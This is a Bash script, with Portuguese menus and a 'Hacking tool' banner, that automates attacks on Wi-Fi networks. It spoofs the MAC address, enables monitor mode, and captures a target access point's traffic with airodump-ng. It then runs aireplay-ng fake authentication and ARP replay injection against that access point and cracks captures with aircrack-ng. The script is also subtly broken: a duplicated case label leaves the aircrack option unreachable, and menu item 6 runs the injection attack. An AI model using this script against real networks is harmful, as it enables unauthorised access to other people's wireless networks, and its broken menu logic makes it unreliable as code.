#!/bin/bash

#Mudar de acordo com o nome do seu adaptador. Default: wlan0

adaptador="wlan0"

limpalinhas() {
    local n=$1
    for ((i=0; i<$n; i++)); do
        # Move the cursor up 1 line and clear to the end of the line
        echo -ne "\033[1A\033[K"
    done
}

while true; do
    echo -e "\e[91mHacking tool by Paulo Mota\e[39m"
    echo -e "1. Status adaptador"
    echo -e "2. Iniciar adaptador (monitor mode, macchanger, kill processes)"
    echo -e "3. Retornar placas ao normal"
    echo -e "4. Desbugar adaptadores de rede"
    echo -e "5. Iniciar monitoramento"
    echo -e "6. Usar o aircrack-ng em arquivo"
    echo -e "7. Sair"

    echo -e -n "\n\nEscolha a opcao: "
    read opcao

    limpalinhas 200

    case "$opcao" in
        1)  #1. Status adaptador
            echo -e "Iwconfig $adaptador\e[34m"
            iwconfig $adaptador
            echo -e "\e[39m"
            ;;
        2)  #Iniciar adaptador (monitor mode, macchanger, kill processes)
            echo "Configurando a placa..."

            echo -e "\n\nOutput ifconfig:\e[34m"
            ifconfig $adaptador down
            echo -e "\e[39m"

            echo -e "Output macchanger:\e[34m"
            sudo macchanger -r $adaptador
            echo -e "\e[39m"

            echo -e "Output airmon check kill:\e[34m"
            sudo airmon-ng check kill
            echo -e "\e[39m"

            echo -e "Output airmon start monitor mode:\e[34m"
            sudo airmon-ng start $adaptador
            echo -e "\e[39m\nFim do output"
            ;;

        3)  #Retornar placas ao normal
            systemctl start NetworkManager
            ifconfig eth0 up
            airmon-ng stop $adaptador
            echo -e "Placas de rede de volta ao normal. A internet deve funcionar agora."
            ;;

        4)  #Desbugar adaptadores de rede (usar em último caso onde não se consegue conectar à internet/abrir o menu do wifi)
            echo -e "\e[34m"
            systemctl restart NetworkManager
            sudo dpkg-reconfigure network-manager
            ifconfig eth0 down
            airmon-ng stop $adaptador > /dev/null
            ifconfig eth0 up
            sudo systemctl status NetworkManager
            echo -e "\e[39m"
            echo -e "O adaptador wireless foi provavelmente desbugado e colocado em monitor mode, faça alguns testes."
            ;;

        5)
            sudo airodump-ng $adaptador

            echo -e -n "\n\nCole o BSSID que deseja monitorar: "
            read bssid;

            echo -e -n "Digite o CANAL da antena: "
            read canal;

            echo -e -n "\nNome para o arquivo de output (Caso nao deseje criar um arquivo, digite ENTER): "
            read outputfile;

            if [ -z $outputfile ]; then
                    sudo airodump-ng --bssid $bssid --channel $canal $adaptador
            else
                    sudo airodump-ng --bssid $bssid --channel $canal -w $outputfile $adaptador
            fi
            ;;
        5)
            echo -e -n "Digite o nome ou cole o caminho para o arquivo: "
            read arquivocap;
            echo -e "\n\nOutput do aircrack:\e[34m"
            aircrack-ng $arquivocap
            echo -e "\e[39m\nFim do output"
            ;;
        6)
            sudo airodump-ng $adaptador

            echo -e -n "\n\nCole o BSSID que deseja monitorar: "
            read bssid;

            echo -e -n "Digite o CANAL da antena: "
            read canal;

            echo -e -n "\nNome para o arquivo de output (Caso nao deseje criar um arquivo, digite ENTER): "
            read outputfile;

            mymac=$(ifconfig | grep wlan0 -A 1 | sed -n '2p' | cut -d ' ' -f10 | cut -d "-" -f1,2,3,4,5,6 | tr '-' ':')
            echo "Mac do adaptador: $mymac"
            echo "Ao visualizar o sinal EAPOL e os frames aumentando, pressione CTRL+C para gerar o arquivo" 
            sleep 2

            pids=()
            ctrl_c() {
                    echo "Encerrando todos os comandos"
                    for pid in "${pids[@]}"; do
                            kill $pid
                    done
            }

            trap ctrl_c INT

            if [ -z $outputfile ]; then
                    sudo airodump-ng --bssid $bssid --channel $canal $adaptador &
                    pids+=($!)
                    sleep 2

                    sudo aireplay-ng --fakeauth 0 -a $bssid -h $mymac $adaptador &
                    pids+=($!)
                    sleep 2

                    sudo aireplay-ng --arpreplay -b $bssid -h $mymac $adaptador &
                    pids+=($!)

            else
                    sudo airodump-ng --bssid $bssid --channel $canal -w $outputfile $adaptador &
                    pids+=($!)
                    sleep 2

                    sudo aireplay-ng --fakeauth 0 -a $bssid -h $mymac $adaptador &
                    pids+=($!)
                    sleep 2

                    sudo aireplay-ng --arpreplay -b $bssid -h $mymac $adaptador &
                    pids+=($!)

            fi
            
            ;;
        7)
            echo "Saindo..."
            exit 0
            ;;

        *)
            echo "Opção inválida."
            ;;
    esac
done
